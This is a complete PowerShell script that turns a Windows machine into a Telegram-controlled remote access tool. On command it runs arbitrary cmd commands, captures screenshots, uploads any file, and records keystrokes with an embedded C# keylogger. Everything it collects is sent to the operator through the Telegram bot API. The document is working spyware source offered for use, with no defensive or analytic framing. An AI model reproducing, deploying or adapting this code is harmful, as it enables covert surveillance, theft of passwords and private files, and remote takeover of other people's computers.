# Telegram Bot PowerShell Script for Keystroke Recording

# Replace with your actual Bot Token from BotFather
$TOKEN = "Enter your API key here"
$API_URL = "https://api.telegram.org/bot$TOKEN"

# Function to send a message
function Send-TelegramMessage {
    param (
        [Parameter(Mandatory=$true)]
        [string]$ChatId,
        [Parameter(Mandatory=$true)]
        [string]$Text
    )
    
    $payload = @{
        "chat_id" = $ChatId
        "text" = $Text
    }
    
    try {
        $response = Invoke-RestMethod -Uri "$API_URL/sendMessage" `
                                    -Method Post `
                                    -Body ($payload | ConvertTo-Json) `
                                    -ContentType "application/json" `
                                    -ErrorAction Stop
        return $response
    }
    catch {
        Write-Host "Error sending message: $($_.Exception.Message)"
        return $null
    }
}

# Function to send a document
function Send-TelegramDocument {
    param (
        [Parameter(Mandatory=$true)]
        [string]$ChatId,
        [Parameter(Mandatory=$true)]
        [string]$FilePath
    )
    
    try {
        if (-not (Test-Path $FilePath)) { throw "File not found: $FilePath" }
        $fileSize = (Get-Item $FilePath).Length
        if ($fileSize -gt 50MB) { throw "File exceeds 50MB limit" }

        $boundary = [System.Guid]::NewGuid().ToString().Replace("-", "")
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        $mimeType = "text/plain"

        $body = [System.IO.MemoryStream]::new()
        $writer = [System.IO.StreamWriter]::new($body)
        $writer.WriteLine("--$boundary")
        $writer.WriteLine("Content-Disposition: form-data; name=`"chat_id`"")
        $writer.WriteLine()
        $writer.WriteLine($ChatId)
        $writer.WriteLine("--$boundary")
        $writer.WriteLine("Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"")
        $writer.WriteLine("Content-Type: $mimeType")
        $writer.WriteLine()
        $writer.Flush()
        $body.Write($fileBytes, 0, $fileBytes.Length)
        $writer.WriteLine()
        $writer.WriteLine("--$boundary--")
        $writer.Flush()

        $body.Position = 0
        $response = Invoke-RestMethod -Uri "$API_URL/sendDocument" `
                                    -Method Post `
                                    -Body $body.ToArray() `
                                    -ContentType "multipart/form-data; boundary=$boundary" `
                                    -ErrorAction Stop
        Write-Host "Document sent: $fileName"
        return $response
    }
    catch {
        Write-Host "Error sending document: $($_.Exception.Message)"
        Send-TelegramMessage -ChatId $ChatId -Text "Failed to send keystroke log: $($_.Exception.Message)" -ErrorAction SilentlyContinue
        return $null
    }
    finally {
        if ($writer) { $writer.Dispose() }
        if ($body) { $body.Dispose() }
    }
}

# Function to record keystrokes
function Record-Keystrokes {
    param (
        [Parameter(Mandatory=$true)]
        [int]$DurationSeconds,
        [string]$OutputPath = "$env:TEMP\keystrokes.txt"
    )
    
    try {
        $keyloggerCode = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class KeyLogger
{
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    public static string Record(string filePath, int durationSeconds)
    {
        StringBuilder keyLog = new StringBuilder();
        DateTime startTime = DateTime.Now;
        string lastWindowTitle = "";
        bool[] keyStates = new bool[255];

        keyLog.AppendLine("Keystroke recording started: " + DateTime.Now);
        keyLog.AppendLine("Duration: " + durationSeconds + " seconds");
        keyLog.AppendLine("-------------------");

        while ((DateTime.Now - startTime).TotalSeconds < durationSeconds)
        {
            Thread.Sleep(10);

            StringBuilder windowTitle = new StringBuilder(256);
            IntPtr foregroundWindow = GetForegroundWindow();
            if (GetWindowText(foregroundWindow, windowTitle, 256) > 0)
            {
                string currentTitle = windowTitle.ToString();
                if (currentTitle != lastWindowTitle)
                {
                    keyLog.AppendLine("[" + DateTime.Now.ToString("HH:mm:ss") + "] Window: " + currentTitle);
                    lastWindowTitle = currentTitle;
                }
            }

            for (int i = 1; i < 255; i++)
            {
                short state = GetAsyncKeyState(i);
                bool isPressed = (state & 0x8000) != 0;
                
                if (isPressed && !keyStates[i])
                {
                    string key = TranslateKey(i);
                    if (!string.IsNullOrEmpty(key))
                    {
                        keyLog.Append(key);
                    }
                }
                keyStates[i] = isPressed;
            }
        }

        keyLog.AppendLine("-------------------");
        keyLog.AppendLine("Recording ended: " + DateTime.Now);
        File.WriteAllText(filePath, keyLog.ToString());
        return filePath;
    }

    private static string TranslateKey(int keyCode)
    {
        bool shift = (GetAsyncKeyState(0x10) & 0x8000) != 0;
        bool caps = Control.IsKeyLocked(Keys.CapsLock);
        
        switch (keyCode)
        {
            case 8: return "[BACKSPACE]";
            case 9: return "[TAB]";
            case 13: return "[ENTER]";
            case 32: return " ";
            case 37: return "[LEFT]";
            case 38: return "[UP]";
            case 39: return "[RIGHT]";
            case 40: return "[DOWN]";
            case 48: case 49: case 50: case 51: case 52:
            case 53: case 54: case 55: case 56: case 57:
                return shift ? ")!@#$%^&*("[keyCode - 48].ToString() : ((char)keyCode).ToString();
            case 65: case 66: case 67: case 68: case 69:
            case 70: case 71: case 72: case 73: case 74:
            case 75: case 76: case 77: case 78: case 79:
            case 80: case 81: case 82: case 83: case 84:
            case 85: case 86: case 87: case 88: case 89: case 90:
                bool isUpper = shift ^ caps;
                return isUpper ? ((char)keyCode).ToString() : ((char)(keyCode + 32)).ToString();
            case 186: return shift ? ":" : ";";
            case 187: return shift ? "+" : "=";
            case 188: return shift ? "<" : ",";
            case 189: return shift ? "_" : "-";
            case 190: return shift ? ">" : ".";
            case 191: return shift ? "?" : "/";
            case 192: return shift ? "~" : "`";
            case 219: return shift ? "{" : "[";
            case 220: return shift ? "|" : "\\";
            case 221: return shift ? "}" : "]";
            case 222: return shift ? "\"" : "'";
            default: return "";
        }
    }
}
"@

        Write-Host "Compiling keylogger code..."
        Add-Type -TypeDefinition $keyloggerCode -ReferencedAssemblies "System.Windows.Forms" -ErrorAction Stop
        Write-Host "Keylogger code compiled successfully"

        Write-Host "Recording keystrokes for $DurationSeconds seconds..."
        $keylogPath = [KeyLogger]::Record($OutputPath, $DurationSeconds)
        
        if (Test-Path $keylogPath) {
            Write-Host "Keystroke log saved to: $keylogPath"
            return $keylogPath
        }
        throw "Failed to create keystroke log file"
    }
    catch {
        Write-Host "Error in Record-Keystrokes: $($_.Exception.Message)"
        return $null
    }
}

# Function to encrypt a file using AES
function Encrypt-File {
    param (
        [Parameter(Mandatory=$true)]
        [string]$InputPath,
        [Parameter(Mandatory=$true)]
        [string]$OutputPath,
        [Parameter(Mandatory=$true)]
        [string]$Password
    )
    
    try {
        $salt = [System.Text.Encoding]::UTF8.GetBytes("StaticSalt123")
        $keyDerivation = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, 10000)
        $key = $keyDerivation.GetBytes(32)  # 256-bit key
        $iv = $keyDerivation.GetBytes(16)   # 128-bit IV

        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv

        $fileBytes = [System.IO.File]::ReadAllBytes($InputPath)
        $encryptor = $aes.CreateEncryptor()
        $memoryStream = [System.IO.MemoryStream]::new()
        $cryptoStream = [System.Security.Cryptography.CryptoStream]::new($memoryStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
        
        $cryptoStream.Write($fileBytes, 0, $fileBytes.Length)
        $cryptoStream.FlushFinalBlock()
        
        [System.IO.File]::WriteAllBytes($OutputPath, $memoryStream.ToArray())
        
        Write-Host "File encrypted: $OutputPath"
        return $OutputPath
    }
    catch {
        Write-Host "Encryption error: $($_.Exception.Message)"
        return $null
    }
    finally {
        if ($cryptoStream) { $cryptoStream.Dispose() }
        if ($memoryStream) { $memoryStream.Dispose() }
        if ($aes) { $aes.Dispose() }
    }
}

# Function to take a screenshot
function Take-Screenshot {
    param (
        [string]$OutputPath = "$env:TEMP\screenshot.png"
    )
    
    try {
        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)
        
        $bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        return $OutputPath
    }
    catch {
        return $null
    }
}

# Function to send a photo
function Send-TelegramPhoto {
    param (
        [Parameter(Mandatory=$true)]
        [string]$ChatId,
        [Parameter(Mandatory=$true)]
        [string]$PhotoPath
    )
    
    try {
        if (-not (Test-Path $PhotoPath)) { throw "Photo file not found" }
        $fileSize = (Get-Item $PhotoPath).Length
        if ($fileSize -gt 10MB) { throw "Photo exceeds 10MB limit" }

        $boundary = [System.Guid]::NewGuid().ToString().Replace("-", "")
        $fileBytes = [System.IO.File]::ReadAllBytes($PhotoPath)
        $fileName = [System.IO.Path]::GetFileName($PhotoPath)

        $body = [System.IO.MemoryStream]::new()
        $writer = [System.IO.StreamWriter]::new($body)
        $writer.WriteLine("--$boundary")
        $writer.WriteLine("Content-Disposition: form-data; name=`"chat_id`"")
        $writer.WriteLine()
        $writer.WriteLine($ChatId)
        $writer.WriteLine("--$boundary")
        $writer.WriteLine("Content-Disposition: form-data; name=`"photo`"; filename=`"$fileName`"")
        $writer.WriteLine("Content-Type: image/png")
        $writer.WriteLine()
        $writer.Flush()
        $body.Write($fileBytes, 0, $fileBytes.Length)
        $writer.WriteLine()
        $writer.WriteLine("--$boundary--")
        $writer.Flush()

        $body.Position = 0
        $response = Invoke-RestMethod -Uri "$API_URL/sendPhoto" `
                                     -Method Post `
                                     -Body $body.ToArray() `
                                     -ContentType "multipart/form-data; boundary=$boundary" `
                                     -ErrorAction Stop
        return $response
    }
    catch {
        Send-TelegramMessage -ChatId $ChatId -Text "Failed to send screenshot: $($_.Exception.Message)"
        return $null
    }
    finally {
        if ($writer) { $writer.Dispose() }
        if ($body) { $body.Dispose() }
    }
}

# Function to run a CMD command
function Run-CmdCommand {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Command
    )
    
    try {
        $process = Start-Process -FilePath "cmd.exe" `
                                -ArgumentList "/c $Command" `
                                -NoNewWindow `
                                -RedirectStandardOutput "$env:TEMP\cmd_output.txt" `
                                -RedirectStandardError "$env:TEMP\cmd_error.txt" `
                                -Wait `
                                -PassThru
        
        $output = Get-Content -Path "$env:TEMP\cmd_output.txt" -Raw
        $errorOutput = Get-Content -Path "$env:TEMP\cmd_error.txt" -Raw
        
        Remove-Item "$env:TEMP\cmd_output.txt","$env:TEMP\cmd_error.txt" -ErrorAction SilentlyContinue
        
        if ($process.ExitCode -eq 0) { return $output.Trim() }
        else { return "Error (Exit Code: $($process.ExitCode)): $errorOutput" }
    }
    catch {
        return "Exception: $($_.Exception.Message)"
    }
}

# Function to get updates
function Get-TelegramUpdates {
    param (
        [int]$Offset = 0
    )
    
    $payload = @{
        "offset" = $Offset
        "timeout" = 30
    }
    
    try {
        return Invoke-RestMethod -Uri "$API_URL/getUpdates" `
                                -Method Post `
                                -Body ($payload | ConvertTo-Json) `
                                -ContentType "application/json" `
                                -ErrorAction Stop
    }
    catch {
        Write-Host "Error getting updates: $($_.Exception.Message)"
        return $null
    }
}

# Function to test bot connectivity
function Test-TelegramBot {
    try {
        $response = Invoke-RestMethod -Uri "$API_URL/getMe" -Method Get -ErrorAction Stop
        Write-Host "Bot connected! Username: $($response.result.username)"
        return $true
    }
    catch {
        Write-Host "Error connecting: $($_.Exception.Message)"
        return $false
    }
}

# Main execution
Write-Host "Testing Telegram Bot connection..."
if (Test-TelegramBot) {
    $lastUpdateId = 0
    # State tracking for each chat
    $chatStates = @{}
    
    Write-Host "Listening for messages... (Press Ctrl+C to stop)"
    
    # Disable verbose/debug output to minimize logging
    $VerbosePreference = "SilentlyContinue"
    $DebugPreference = "SilentlyContinue"
    
    while ($true) {
        $updates = Get-TelegramUpdates -Offset $lastUpdateId
        if ($updates.ok -and $updates.result) {
            foreach ($update in $updates.result) {
                $lastUpdateId = $update.update_id + 1
                $chatId = $update.message.chat.id
                $text = $update.message.text.ToLower()
                
                # Log messages only if not in password state
                if ($chatStates[$chatId] -and $chatStates[$chatId].Step -eq "WaitingForPassword") {
                    # Suppress all output for password
                }
                else {
                    Write-Host "Received from ${chatId}: $text"
                }
                
                # Initialize state for new chats
                if (-not $chatStates.ContainsKey($chatId)) {
                    $chatStates[$chatId] = @{
                        "Step" = "Idle"
                        "Seconds" = $null
                        "Encrypt" = $null
                        "Password" = $null
                    }
                }
                
                $state = $chatStates[$chatId]
                
                switch ($state.Step) {
                    "Idle" {
                        switch -Wildcard ($text) {
                            "screenshot" {
                                Send-TelegramMessage -ChatId $chatId -Text "Taking screenshot..."
                                $screenshotPath = Take-Screenshot
                                if ($screenshotPath) {
                                    Send-TelegramPhoto -ChatId $chatId -PhotoPath $screenshotPath
                                    Remove-Item $screenshotPath -ErrorAction SilentlyContinue
                                }
                            }
                            "cmd *" {
                                $command = $text.Substring(4).Trim()
                                Send-TelegramMessage -ChatId $chatId -Text "Running: $command"
                                $result = Run-CmdCommand -Command $command
                                if ([string]::IsNullOrEmpty($result)) {
                                    Send-TelegramMessage -ChatId $chatId -Text "No output"
                                }
                                elseif ($result.Length -gt 4096) {
                                    for ($i = 0; $i -lt $result.Length; $i += 4096) {
                                        Send-TelegramMessage -ChatId $chatId -Text $result.Substring($i, [Math]::Min(4096, $result.Length - $i))
                                    }
                                }
                                else {
                                    Send-TelegramMessage -ChatId $chatId -Text $result
                                }
                            }
                            "upload *" {
                                $filePath = $text.Substring(7).Trim()
                                if (Test-Path $filePath) {
                                    Send-TelegramMessage -ChatId $chatId -Text "Uploading: $filePath..."
                                    Send-TelegramDocument -ChatId $chatId -FilePath $filePath
                                }
                                else {
                                    Send-TelegramMessage -ChatId $chatId -Text "File not found: $filePath"
                                }
                            }
                            "keystrokes" {
                                Send-TelegramMessage -ChatId $chatId -Text "For how many seconds do you want to record the keystrokes (in seconds)? Please type a number."
                                $state.Step = "WaitingForSeconds"
                            }
                            default {
                                Send-TelegramMessage -ChatId $chatId -Text "Echo: $text`nCommands: 'screenshot', 'cmd <command>', 'upload <file_path>', 'keystrokes'"
                            }
                        }
                    }
                    "WaitingForSeconds" {
                        if ($text -match '^\d+$') {
                            $state.Seconds = [int]$text
                            Send-TelegramMessage -ChatId $chatId -Text "Would you like the keystroke log to be encrypted? (yes/no)"
                            $state.Step = "WaitingForEncryptionChoice"
                        }
                        else {
                            Send-TelegramMessage -ChatId $chatId -Text "Please enter a valid number of seconds."
                        }
                    }
                    "WaitingForEncryptionChoice" {
                        if ($text -eq "yes") {
                            Send-TelegramMessage -ChatId $chatId -Text "Please enter a password for encryption."
                            $state.Encrypt = $true
                            $state.Step = "WaitingForPassword"
                        }
                        elseif ($text -eq "no") {
                            $state.Encrypt = $false
                            Send-TelegramMessage -ChatId $chatId -Text "Recording keystrokes for $($state.Seconds) seconds..."
                            $keylogPath = Record-Keystrokes -DurationSeconds $state.Seconds
                            if ($keylogPath) {
                                Send-TelegramDocument -ChatId $chatId -FilePath $keylogPath
                                Remove-Item $keylogPath -ErrorAction SilentlyContinue
                            }
                            else {
                                Send-TelegramMessage -ChatId $chatId -Text "Failed to record keystrokes"
                            }
                            $state.Step = "Idle"
                            $state.Seconds = $null
                            $state.Encrypt = $null
                        }
                        else {
                            Send-TelegramMessage -ChatId $chatId -Text "Please respond with 'yes' or 'no'."
                        }
                    }
                    "WaitingForPassword" {
                        # Securely handle the password without logging
                        $securePassword = $update.message.text  # Use original text, not logged
                        Send-TelegramMessage -ChatId $chatId -Text "Recording keystrokes for $($state.Seconds) seconds and encrypting..."
                        $keylogPath = Record-Keystrokes -DurationSeconds $state.Seconds
                        if ($keylogPath) {
                            $encryptedPath = "$env:TEMP\keystrokes_encrypted.txt"
                            $encryptedFile = Encrypt-File -InputPath $keylogPath -OutputPath $encryptedPath -Password $securePassword
                            if ($encryptedFile) {
                                Send-TelegramDocument -ChatId $chatId -FilePath $encryptedFile
                                Remove-Item $encryptedPath -ErrorAction SilentlyContinue
                            }
                            else {
                                Send-TelegramMessage -ChatId $chatId -Text "Failed to encrypt keystroke log"
                            }
                            Remove-Item $keylogPath -ErrorAction SilentlyContinue
                        }
                        else {
                            Send-TelegramMessage -ChatId $chatId -Text "Failed to record keystrokes"
                        }
                        # Clear sensitive data immediately
                        $state.Step = "Idle"
                        $state.Seconds = $null
                        $state.Encrypt = $null
                        $state.Password = $null
                        Remove-Variable -Name securePassword -Force -ErrorAction SilentlyContinue
                    }
                }
            }
        }
        Start-Sleep -Seconds 1
    }
}